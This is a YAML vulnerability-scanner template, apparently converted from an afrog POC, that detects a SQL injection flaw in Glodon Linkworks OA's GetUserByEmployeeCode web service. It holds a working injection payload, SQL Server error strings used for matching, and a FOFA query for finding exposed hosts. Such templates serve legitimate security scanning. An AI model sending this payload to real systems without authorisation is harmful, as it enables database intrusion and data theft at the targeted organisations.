# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: employeeCode=1'-1/user--'&EncryptData=1
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - 在将 nvarchar 值
          - 转换成数据类型 int 时失败
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/Org/service/Service.asmx/GetUserByEmployeeCode'
id: glodon-linkworks-gwgdwebservice-sqli
info:
  author: zan8in
  description: |-
    广联达 Linkworks办公OA GWGdWebService接口存在SQL注入漏洞，发送请求包后可以获取数据库中的敏感信息
    fofa: header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 广联达 Linkworks GWGdWebService SQL 注入
  severity: high
  tags: glodon,sqli,argus-import
